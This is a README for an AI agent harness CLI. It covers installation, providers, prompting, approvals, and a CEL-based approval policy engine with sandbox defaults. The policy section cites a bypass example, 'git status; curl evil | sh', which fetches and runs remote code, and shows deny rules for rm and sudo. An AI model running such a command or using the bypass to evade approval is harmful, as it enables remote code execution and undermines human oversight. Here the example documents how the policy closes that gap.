# lisa-cli

[Lisa Harness](https://github.com/Lisa-Harness/lisa) CLI host.

## Install

### Configure model access

The Lisa Harness CLI host supports several providers out-of-the-box.
To use one (or more), set the requisite environment variables:

| Provider       | Environment variables                                                                          |
| -------------- | ---------------------------------------------------------------------------------------------- |
| `anthropic`    | `LISA_ANTHROPIC_API_KEY`, `LISA_ANTHROPIC_VERSION`, `LISA_ANTHROPIC_BASE_URL`                  |
| `aws`          | `LISA_AWS_ACCESS_KEY_ID`, `LISA_AWS_SECRET_ACCESS_KEY`, `LISA_AWS_REGION`                      |
| `azure_openai` | `LISA_AZURE_OPENAI_API_KEY`, `LISA_AZURE_OPENAI_API_VERSION`, `LISA_AZURE_OPENAI_ENDPOINT`     |
| `google`       | `LISA_GOOGLE_API_KEY`, `LISA_GOOGLE_API_BASE_URL`                                              |
| `openai`       | `LISA_OPENAI_API_KEY`                                                                          |
| `openrouter`   | `LISA_OPENROUTER_API_KEY`, `LISA_OPENROUTER_BASE_URL`                                          |
| `ollama`       | `LISA_OLLAMA_HOST` *(defaults to OLLAMA_HOST=<http://localhost:11434/>)*                       |

Either in the shell, e.g.,

```bash
export LISA_OPENROUTER_API_KEY=sk-or-v1-...
```

Or, precreate a `.lisa` directory in your home directory,
and copy/edit the example [.env](.env.example) file into it.

### Run the installer

Linux or Mac:

```bash
curl -fsSL https://raw.githubusercontent.com/Lisa-Harness/lisa-cli/main/install.sh | bash
```

Windows:

```pwsh
irm https://raw.githubusercontent.com/Lisa-Harness/lisa-cli/main/install.ps1 | iex
```

Both installers accept options, in Bash and PowerShell spellings:

| Option       | Bash                                     | PowerShell                            |
| ------------ | ---------------------------------------- | ------------------------------------- |
| Help         | `--help`                                 | `-?`                                  |
| Providers    | `--provider ollama,openai`               | `-Provider ollama,openai`             |
| Local source | `--source local --lisa-repo ~/Code/lisa` | `-Source local -LisaRepo ~/Code/lisa` |

### Or install with uv

1. Install via `uv`
1. Generate a model manifest
1. Optionally edit it
1. Apply the it
1. Verify the setup

```bash
uv tool install --python 3.12 lisa-cli[prompt]
lisa models discover
# optionally edit ~/.lisa/state/models.proposed.yaml
lisa models apply
lisa verify
```

### Updating

There are two independent things to update, and they live in different
places: the **CLI** (a `uv tool` venv) and the **packs** you installed into
the runtime (`~/.lisa/venv`). `lisa update` handles the first; `lisa pack
update --all` handles the second.

```bash
lisa update                    # upgrade the CLI itself
lisa pack update --all         # re-install installed packs from their sources
```

`lisa update` is a pass-through to `uv tool upgrade`, which replays the
install receipt (`~/.local/share/uv/tools/lisa-cli/uv-receipt.toml`). That
receipt records how lisa was installed — the `[prompt]` extra, any `--with`
framework requirements, and `no-sources` — so use `lisa update` rather than
`uv tool install --upgrade lisa-cli`, which resolves from the index and
rewrites the receipt.

It locates the install from the running interpreter rather than assuming the
default tool directory, so installs made with a custom `UV_TOOL_DIR` upgrade
correctly, and an interpreter uv does not own (a plain virtualenv, pipx) is
refused instead of guessed at. Flags:

| Flag | Effect |
| --- | --- |
| `--force` | Add `--reinstall`, so a local or git install whose version did not bump still picks up new code. |
| `--dry-run` | Print the uv command without running it. |

Two situations it deliberately hands back to you:

- From a repo checkout there is no tool to upgrade; it prints
  `git pull && uv sync` instead.
- On Windows the running `lisa.exe` cannot be replaced in place, so it
  prints the uv command for you to run after exiting.

#### Why packs need their own update

Packs are not installed beside the CLI. They go into a separate venv
(`~/.lisa/venv`, shared across profiles) that the runtime seeds with the
framework packages packs depend on. The two installs overlap, so it is worth
being precise about what an upgrade does and does not touch.

**What the CLI upgrade already covers.** At startup the packs venv's
site-packages is appended to `sys.path`, but the CLI's own tool venv comes
first, so packs import *the upgraded* `kernel`, `sdk`, and bundled packs. A
CLI upgrade therefore does not leave packs running against an old framework.

**What it does not cover.** Each pack's *own* dependency set lives only in
the packs venv, and the seed path installs the framework with plain
`uv pip install` — which resolves what is missing and never upgrades a
requirement that is already satisfied. So a pack that pinned (or resolved) an
older third-party dependency keeps it after a CLI upgrade. That only bites
when the pack needs a version it did not ask for before.

`lisa pack update --all` re-installs every runtime-installed pack from its
recorded source (`installed-packs.json`), which re-resolves its dependencies
against the current framework. Bundled packs and entries seeded with a
placeholder source are skipped — they have nothing to re-fetch.

The practical sequence:

```bash
lisa update              # CLI: always safe, takes effect next launch
lisa pack update --all   # packs: run if a pack misbehaves after upgrading
```

The second is not mandatory after every CLI upgrade; `lisa update` prints a
reminder naming it when the packs venv exists, so the command is discoverable
at exactly the moment you would want it. Both are one-shot commands that
exit; new code takes effect on the next `lisa` launch.

### Session context

The installer will write this to `~/.lisa/config/sesion_context.md` automatically.
So you will need to create it yourself if you installed with `uv`.

```yaml
---
schema_version: 2
name: my-session
surface:
  type: personal_dm
  id: host-console
  memory_scope: personal
resources:
  packs:
    configuration: {}
    required:
      - lisa-pack-markdown
      - lisa-pack-personas
    # - lisa-pack-tavily
# Web search requires a web search provider pack, e.g., lisa-pack-tavily.
# Add one above then designate it as the web_search tool below.
# Then remove the hint from the bottom of the text below that.
providers:
  capabilities:
    memory: lisa-pack-memory
# tools: { web_search: lisa-pack-tavily }
routing: { from: { pack: lisa-pack-core, session: default } }
---
# My Session

The user is running you via the CLI host at github.com/Lisa-Harness/lisa-cli.
However they have not yet installed any web search provider packs (e.g., lisa-pack-tavily).
The user should be reminded to remove this text once they have installed a web search provider pack.
```

## Usage

```bash
lisa                                # show usage
lisa --help                         # also works after subcommands, e.g., prompt --help
lisa verify                         # runs the diagnostic check including model availability
lisa update                         # upgrade the installed CLI (uv tool upgrade)
lisa prompt                         # run a turn with input via the turn editor
lisa prompt "Hi"                    # run a turn with the CLI args as the input
fortune | lisa prompt               # run a turn with stdin as the input
ls | lisa prompt "look ok to you?"  # run a turn with stdin and CLI args as inputs
```

`lisa verify` expects a configured model manifest
`lisa models discover` generates one; use `--force` if one already exists
`lisa models apply` checks the syntax and router rules before applying

### Prompting (`prompt` with stdin, the editor, and `--raw`)

`prompt` takes its message from three sources, in fallback order. Quote
rules differ per source — pick the one that fits:

**1. Arguments (shell rules apply).** Multiple words are joined with spaces,
so short prompts work unquoted; quote only to preserve inner spaces or
literal quote characters:

```bash
lisa prompt fix the config parser
lisa prompt "summarize the thread"
```

The shell still owns argv: an apostrophe (`lisa prompt fix what's broken`)
or a quote you wanted in the message needs shell quoting, and `$(...)`
expands before lisa even runs.

**2. No arguments on a terminal (lisa-managed input; no shell rules).**
`lisa prompt` with nothing to send drops into an input editor. Quote
characters, backticks, and apostrophes are collected literally — no
escaping. Key layout is swapped by default: **Enter inserts a newline;
Ctrl-J sends** — Enter never fires the turn, so a hurried
keypress can't send a half-typed message or leak to your shell after the
run (and Ctrl-Z stays a plain shell suspend). Ctrl-C aborts with the
SIGINT exit code. `$(command)` is expanded here as shell
substitution (nesting works; a failed command is a loud error, exit 2;
escape with `\$(` for a literal `$(`). Single-quoted spans don't expand
and backticks stay literal. Submitted prompts persist to
`<data-dir>/state/prompt_history.txt` for Alt+Up reuse. The editor uses
prompt_toolkit, included by both installers via `lisa-cli[prompt]`.
Without that extra, Lisa warns and uses a plain line-at-a-time reader
(Ctrl-D on an empty line sends; Ctrl-J does not submit).
Alt+Enter is not a send or newline shortcut. Prefer chat-box Enter-sends?
Pass `--swap-keys`,
or set `LISA_PROMPT_KEYS=1` (any truthy value; the flag wins over the
env).

Sending immediately shows a `starting runtime` spinner, including while
`$(command)` substitutions and runtime setup run. It continues into the
turn's live activity display. `-q` suppresses it; `--raw` sends it to
stderr, and redirected activity output never contains a spinner.

The editor's hint line is built in and follows the active key layout. To
customize it, use these overrides. Precedence per fragment:

1. `LISA_PROMPT_PS1` — verbatim whole-line replace; empty value
   suppresses hints entirely (highest precedence, env).
2. Per-fragment env backstops: `LISA_PROMPT_HINT_SEND`, `_NEWLINE`,
   `_ABORT`, `_BANNER` (empty value suppresses that fragment).
3. `<data-dir>/config/prompt_hints.yaml` — optional, hand-created file
   with `send`, `newline`, `abort`, or `banner` keys (installers do not
   create it).
4. Built-in facts per key layout (what actually sends/adds a line).

The settings cannot contradict behavior: the layout facts (Enter sends
vs Enter adds a line) follow `--swap-keys`/`LISA_PROMPT_KEYS`, and the
Ctrl-Z-suspends note is not overridable — a hint that lies about keys
is worse than no hint. A malformed `prompt_hints.yaml` warns on stderr
once and falls back to built-ins; settings never block a turn.

**3. Piped stdin (payload rules).** When stdin is not a tty its contents
are attached ahead of your instruction, so config/data can flow through
the model into another command. A quoted heredoc is the fully literal
power path:

```bash
cat /etc/whatever.conf | lisa prompt "recommend improvements"
sudo systemctl status whatever 2>&1 | lisa prompt -r "fix it for me." > whatever.conf.new
lisa prompt <<'EOF'
fix the "config" parser for $(this) host: it can't handle 'quoted values'
EOF
```

`-r`/`--raw` writes the response verbatim to stdout — no Rule header, no
Markdown re-render, no `⚡` footer — moves activity output to stderr, and
prepends an output contract to the turn so the model emits only the requested
result (no preamble or commentary). Combine with `-q` to also suppress the
stderr activity lines. `--no-stdin` disables stdin attachment (use when a
foreground pipe should not be consumed). `-q -r` = only the raw response on
stdout.

An unresolved approval is a hard stop: the request id is durable,
the process prints the required decision commands to stderr and exits
with code `3`, so pipelines never mistake an un-decided approval for a
completed turn. Decide it from the same shell — no session needed — and re-run:

```bash
lisa approve <request-id>                    # decide; no new model turn
lisa approve <request-id> --remember "git status"  # decide + persist allow rule
lisa deny <request-id>
```

(A bare `lisa approve` with no id resolves to the single pending request.
A pre-armed decision also works in one shot:
`lisa prompt --approve <request-id> "continue the task"` dispatches the
approval first — its own typed dispatch to the approval core — then runs the
turn message as a second dispatch on the same runtime. `--deny <id>` works
the same way; both accept bare `pending` to target the single pending
request.)

A model yield — the turn ends with the model asking you a question instead of
producing a result — is the same contract: the question prints to stderr, stdout
gets nothing, and the process exits with code `4`. The raw-mode contract tells
the model to make the best-supported inference from the provided material and
state assumptions in a trailing comment instead of asking; when even that is
impossible, re-run with the missing information included in the prompt.

### Live activity display

On a tty, `prompt` keeps the turn visible while the model works: a one-line
status (turn · mode · model · in-flight tool · thinking size · iteration ·
tool budget · elapsed) with a trailing spinner, plus a bounded stream box
that scrolls only the tail of the model's live output — so long generations
show motion without pushing prior detail up the scrollback. Reasoning-model
calls get a calmer spinner and a live `thinking Nk` meter. Streamed tool
output (e.g. a bash command's stdout) renders in its own bounded box — the
tail of the in-flight output, with elided-line counts in the title — instead
of printing every line to scrollback; a failed tool flushes the tail so
error context survives, and piped/non-tty runs keep the full per-line
transcript. The final answer always re-renders once with full Markdown
formatting under a `Response · model · turn N` rule, followed by the `⚡`
footer (time · turn · tools · models · tokens · cost). The `turn N` figure
is the thread's global turn index — the same number stamped on the thread
entry — so a result can be replayed with `lisa last N` or inspected with
`lisa debug N` without counting from the top. `lisa last` labels its replay
with that number too: a `Response · turn N` rule on a tty, a `[ turn N ]`
header before piped/replayed output.

#### Reading the token and cost figures

The `tok` number is the **context walk**: the sum of every model call's
`total_tokens` across the turn. An agentic turn makes many calls and each one
re-sends the whole conversation, so the walk grows superlinearly and can land
an order of magnitude above what the provider actually bills — a 68-call turn
has been observed walking 4.9M tokens against a 354k bill. It answers "how
much context did this turn chew through", not "what did it cost".

When the turn hit a prompt cache, a second figure follows:
`billed N` — uncached prompt plus completion, i.e. the tokens charged at full
rate. This only appears when it differs from the walk, so a cache-free turn
shows one number.

The `$` figure has two forms:

| Form | Meaning |
| --- | --- |
| `$0.0042` | The provider reported its own charge for every call in the turn (OpenRouter returns this as `usage.cost`). Authoritative — it already reflects the provider's real cache read/write rates. |
| `~$0.0099` | The harness priced the turn itself from the model manifest's per-token rates. Correct arithmetic, list-price only. |

A turn mixing providers where only some report a cost shows the `~$`
estimate: summing a partial set of provider charges would understate the
bill. Both figures are recorded per call in `logs/token-usage.jsonl`
(`cost_usd` and `provider_cost_usd`) so `lisa tokens` and any installed pack
can reconcile harness arithmetic against the provider's meter.

#### Proxy-reported savings

A proxy in the path — compression, cache steering, anything that rewrites a
request — can report what it saved, and the footer shows the turn's total as
a trailing `saved N` segment:

```
⚡ 12s · turn 41 · 9 tools · 3 models · 160.35k tok · billed 3.35k · ~$0.0056 · saved 70k
```

The proxy declares its own vocabulary in a pack manifest; the harness never
hard-codes one. Under the proxy entry's `status` block:

```yaml
status:
  telemetry:
    counter_unit: tokens          # unit the counters are denominated in
    savings_field: tokens_saved   # which counter is this turn's saving
    headers:                      # response header -> field name
      x-acme-tokens-before: tokens_before
      x-acme-tokens-saved: tokens_saved
```

Every declared header is lifted off each response under the field name the
pack chose, summed across the turn, and recorded in
`logs/token-usage.jsonl` under `extra.proxy_telemetry`. The footer labels only
counters it recognises (`savings_field`, defaulting to `tokens_saved`); an
unrecognised counter is still recorded for `lisa tokens` and any pack reading
the log, so extending the vocabulary is a manifest edit rather than a code
change.

Counters are omitted when the proxy does not send them, so "no saving on this
call" is never confused with "saved zero". `savings_field` must name a
declared header — a footer promising a figure the proxy never sends is a
declaration error.

`--streaming` controls what the box shows: `none` (spinner only), `stage`,
`text` (the forming answer), or `hybrid` (the model's thinking, default).
Non-tty output (pipes, redirects, CI) never renders any of it — just the
completed event lines and the final answer.

### Host commands (real subcommands — no slash grammar at the CLI)

Host operations are typed Typer commands, full stop. The CLI parses each
flag once and passes values across the host seam — no slash-command string
is ever synthesized or re-parsed, and a CEL `--when` expression arrives
verbatim (no quoting contract):

```bash
lisa debug [N] | last [N]                              # turn inspection
lisa models show | discover --force | apply
lisa pack list | install <spec> | uninstall <pkg> | update [--all]
lisa update [--force] [--dry-run]                     # upgrade the CLI itself
lisa policy | policy mode trust | policy bare off
lisa policy rule list | add allow --when '<CEL>' | remove allow:1
lisa approve <id> [--remember <prefix>] | deny <id>
```

`lisa update` upgrades the CLI and `lisa pack update --all` re-installs packs
from their recorded sources; the two are separate installs — see
[Updating](#updating).

Pack-registered host commands resolve as **dynamically generated
subcommands** (real `--help`, real shell completion, same runtime options)
— the recovery pack's `/stalls`, `/retry`, `/resume` are simply:

```bash
lisa stalls
lisa retry <id>
lisa resume
```

A leading `/` (a runtime slash command) is a friendly usage error pointing
at the named subcommand — `lisa /settings` suggests `lisa settings`.

### Approvals

By default, commands execute without an approval prompt only when the bash pack
reports a working, contained Bubblewrap sandbox — or when an explicit `allow`
rule matches (rules are evaluated ahead of the sandbox downgrade). Missing,
degraded, or unknown sandbox state fails closed and shows an approval panel
instead. Decide with the top-level host command (the request id survives the
process boundary):

```bash
lisa approve <request-id>                                  # decide only
lisa deny <request-id>
lisa approve <request-id> --remember "git status"          # decide + persist narrow allow
```

The panel badges the sandbox state and shows the policy reason and effect tier
that fired, so you can see which rule or guard drove the prompt. `--remember`
persists an allow rule scoped to the tool and the command prefix — the default
prefix is the command's first two tokens (`git status` from `git status -sb`) —
rather than granting broad shell access; manage the accumulated rules with
`lisa policy rule list` and `lisa policy rule remove`.

### Policy (`lisa policy`)

The approval policy is a CEL-backed YAML document at
`<data_dir>/config/policy.yaml` that decides which actions need operator
approval before they run. Inspect and change it from Typer commands — no
model turn or hand-editing (the host owns every policy write):

```bash
lisa policy                               # show the active document (+ any load errors)
lisa policy mode trust                   # auto-allow write/execute (ask|trust|plan)
lisa policy bare off                     # stop prompting for unsandboxed execute
lisa policy rule list                    # rules with their remove addresses
lisa policy rule add allow --tool bash_run --when 'action.argv[0] == "git" && action.argv.size() <= 2'
lisa policy rule add deny --when '("rm" in action.argv) || ("sudo" in action.argv)'
lisa policy rule remove allow:1          # drop rule 1 of the allow list
```

Changes take effect immediately — the engine re-reads `policy.yaml` on every
approval request. The default document is `mode: ask`, `sandbox_downgrade:
true`, `bare_requires_approval: true`, and no rules.

**Rules.** Each entry under `allow`/`ask`/`deny` is a matchers object; all
present matchers must match (a rule with no matchers matches nothing, and a
`when`-only rule is valid):

| Matcher | Matches |
| --- | --- |
| `tool` | exact tool id (e.g. `bash_run`) |
| `effect` | exact effect kind: `read` · `write` · `execute` · `external_write` |
| `pack` | exact owning pack id |
| `command_prefix` | the shell command starts with this string |
| `when` | a [CEL](https://github.com/google/cel-spec) boolean expression over the invocation |

The `when` expression is the powerful matcher. Its bindings cover the
structural facts (`action.tool`, `action.effect`, `action.pack`), the command
(`action.command` and `action.argv` — the command tokens, so token matching
closes the `command_prefix` shell-metacharacter bypass such as
`git status; curl evil | sh`), the full `action.parameters` map, `identity.*`
(workspace/user/surface/mode/scope), and `containment` (the resolved sandbox
state). CEL has no side effects and no I/O, so expressions are safe to
evaluate on every approval request. CEL string literals use double quotes, so
single-quote the YAML value; on `rule add`, pass the expression after `--when`
unquoted or in one outer shell quote — the raw tail is kept verbatim, inner
literals included:

```yaml
allow:
  - tool: bash_run
    when: 'action.argv[0] == "git" && action.argv.size() <= 2'
deny:
  - when: '("rm" in action.argv) || ("sudo" in action.argv)'
```

**Decision order.** For each approval-gated action the ladder is fixed and
short-circuiting: `deny` rules (loud — a tool error the model can reroute on,
never a silent skip), then `ask` rules, then `allow` rules, then the sandbox
downgrade (a `contained` `execute` auto-approves even under `plan` mode;
degraded, none, and unknown containment fail closed), then the mode fallback
(`read` always allows, `plan` denies every effectful action, `trust` allows
`write`/`execute`, `ask` prompts). Auto-approvals are auditable and capped at
10 per turn — beyond the cap the host prompts instead of continuing.

Two things never ride the dial: an `external_write` escapes the sandbox by
definition, so auto-approving one takes an explicit allow rule, and an
unsandboxed `execute` prompts even under `trust` while
`bare_requires_approval` is on (`policy bare on|off`).

**Fail closed.** A missing, invalid, or non-mapping `policy.yaml` — or one
whose `when` expression does not compile — loads as ask-mode defaults with no
rules, and `lisa policy` renders the load error. An expression that
fails at evaluation time prompts instead of skipping the rule (a skipped
`deny` would be an allowed `rm`). `rule add` compile-checks `--when` before
the write, so a bad add is rejected rather than poisoning the document.

The full authoring reference — the bindings table, more rule examples,
containment states, and quoting rules — lives in
`../lisa/docs/POLICY_GUIDE.md` in the framework checkout.

### Lazy `prompt` routing

Set `LISA_PROMPT_UNKNOWN=1` to let an unrecognized first positional become
the `prompt` message, so you can skip typing `prompt` for ad-hoc one-shots:

```bash
LISA_PROMPT_UNKNOWN=1 lisa "do something"
```

Routing is Click's own command resolution (a custom Typer group resolves
unknowns) — no argv rewriting happens before the parser. Registered
subcommands (`verify`, `pack`, `models`, …) and generated pack commands
(`stalls`, `retry`, …) are never rerouted, so the env var is safe to leave
on. Runtime options belong to each subcommand (`lisa prompt --log-level
debug …`). Prompt-only flags (`-r/--raw`, `-q/--quiet`, `--no-stdin`)
appearing before the positional parse at group level and ride onto the
injected turn, so `lisa -r "fix it"` behaves as `lisa prompt -r "fix it"`,
and a bare `lisa -r` (no positional, routing on) also opens the editor
with the raw contract applied to the submitted text.

### Profiles (`--profile`, `LISA_PROFILE`)

A **profile** is a named sub-workspace of the data dir:
`~/.lisa/profiles/<name>`. It isolates the whole category tree below —
threads, `memory.db`, `models.yaml`, `policy.yaml`, approvals, `files/` —
while **sharing the base packs venv**, so packs are installed once and
discovered from every profile:

```text
~/.lisa/                          # base data dir
├── config/  state/  data/  cache/  logs/  run/
├── venv/                         # packs venv — shared by all profiles
└── profiles/
    └── ansible/                  # LISA_PROFILE=ansible (or --profile ansible)
        ├── config/  state/  data/  cache/  logs/  run/
        └── (no venv/ — resolves to the base venv)
```

```bash
lisa --profile ansible            # one-shot: use the 'ansible' profile
LISA_PROFILE=ansible lisa         # env var form (persistent for the shell)
lisa --profile ansible verify     # works on every subcommand
```

Precedence: `--data-dir` (explicit) > `LISA_DATA_DIR` > `--profile` /
`LISA_PROFILE` > `~/.lisa`. A fresh profile starts empty (defaults, like a
fresh install); seed it from the base dir when you want a head start:

```bash
mkdir -p ~/.lisa/profiles/ansible/config
cp ~/.lisa/config/models.yaml ~/.lisa/profiles/ansible/config/
```

Note: a profile switches the auto-discovered `config/session_context.md`
like any other config file, but an explicit `--session-context` flag or
`LISA_SESSION_CONTEXT_PATH` still takes precedence over whatever the
profile carries.

(The profile name must be a single path-safe segment — letters, digits,
`-`, `_`, `.`.)

### Data directory layout

The data dir (base or profile) groups everything into lifecycle
categories; the names live in one place (`sdk.layout`):

```text
~/.lisa/
├── config/    models.yaml · policy.yaml · session_context.md
│              (mcp_servers.yaml and overlays/ appear when a pack or your
│               setup adds them — they are optional, not seeded by default)
├── state/     installed-packs.json · state.json · approvals.json ·
│              recovery-items.json · code-change-artifacts.json ·
│              repl_history.txt · models.proposed.yaml
│              (written as needed; a clean install may not have them all —
│               state.json and code-change-artifacts.json appear on first use)
├── data/      memory.db · threads/ · files/ · backups/
├── cache/     fetch/ · layers/    (rm-safe)
├── logs/      host.jsonl · token-usage.jsonl · mcp/<server_id>.jsonl
│              · pack logs (e.g. bash-<session>.log, bwrap-<session>.log)
├── run/       per-session execution state, keyed by session hash (rm-safe):
│              <key>/ jobs/ · scratch/ · profile/ · sandbox-facts.json ·
│              per-session logs (e.g. bash-<key>.log)
├── venv/      packs venv (shared with profiles) — a second install, refreshed
│              by `lisa pack update --all` rather than by `lisa update`
└── .env
```

`cache/` and `run/` can be deleted at any time. A backup of `config/`,
`state/`, and `data/` captures everything durable.

## Development

This repo is a uv workspace whose only member is `hosts/cli/` (src layout:
`hosts/cli/src/hosts/cli/`), matching the framework packages in the sibling
`../lisa` checkout. The layout is:

```text
Code/
├── lisa/              # framework (kernel, sdk, mcp_server, host)
└── lisa-cli/          # this repo
```

Until the framework packages are published to PyPI, a clone needs the
sibling framework checkout:

```bash
git clone https://github.com/Lisa-Harness/lisa-cli.git
git clone https://github.com/Lisa-Harness/lisa.git

cd lisa-cli
# edit pyproject.toml: uncomment the lisa-* path sources (sibling ../lisa)
uv sync --extra dev
uv run pytest -m "not live"
uv run lisa --help
```

## Architecture

`lisa-cli` wraps the transport-neutral `runtime` package (from `lisa-harness-runtime`)
with a Typer + Rich terminal interface. Every command is a one-shot process; turns
run through `lisa prompt` and its `PromptTransport` renders the turn trajectory to
scrollback. The CLI implements `TransportCallbacks`; the runtime never imports
Rich, Typer, or any transport-specific code.

See `../lisa/docs/BOUNDARIES.md` for the full architecture.

## License

[MIT](LICENSE), copyright 2026 The Migus Group. The Lisa Harness framework
itself lives in [`Lisa-Harness/lisa`](https://github.com/Lisa-Harness/lisa)
and carries the same license; external providers, packs, and dependencies
have their own licenses and terms.
